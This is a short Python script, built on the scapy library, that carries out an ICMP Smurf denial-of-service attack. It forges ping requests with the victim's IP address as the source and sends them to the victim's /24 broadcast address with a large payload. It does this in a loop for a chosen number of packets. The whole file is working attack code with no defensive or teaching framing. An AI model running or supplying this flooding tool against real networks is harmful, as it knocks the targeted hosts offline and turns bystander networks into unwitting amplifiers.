from scapy.all import *
from scapy.layers.inet import IP, ICMP

ICMP_PROTOCOL = "icmp"

SMURF_ICMP_PAYLOAD_DATA = "abcd"
LEN_OF_PAYLOAD_TO_SEND = 1000


def send_spoofed_packet(target_ip: str, broadcast_ip: str, payload_data: str, len_to_send: int) -> None:
    ping_request = IP(src=target_ip, dst=broadcast_ip, proto=ICMP_PROTOCOL) / ICMP() / (payload_data * len_to_send)
    send(ping_request)


def get_broadcast_ip_address(target_ip: str) -> str:
    ip_parts = target_ip.split(".")
    return ip_parts[0] + "." + ip_parts[1] + "." + ip_parts[2] + "." + "255"


def perform_icmp_smurf_attack(target_address: str, number_of_packets: int):
    successful_requests = 0
    broadcast_ip = get_broadcast_ip_address(target_address)
    for packet in range(number_of_packets):
        try:
            send_spoofed_packet(target_address, broadcast_ip, SMURF_ICMP_PAYLOAD_DATA, LEN_OF_PAYLOAD_TO_SEND)
            successful_requests += 1
            print(f"Done sending {packet + 1} packets. Sent ping request from {target_address} to {broadcast_ip}.")
        except Exception as e:
            print(f"An error occurred: {e}. Sent {successful_requests} packets.")
            continue
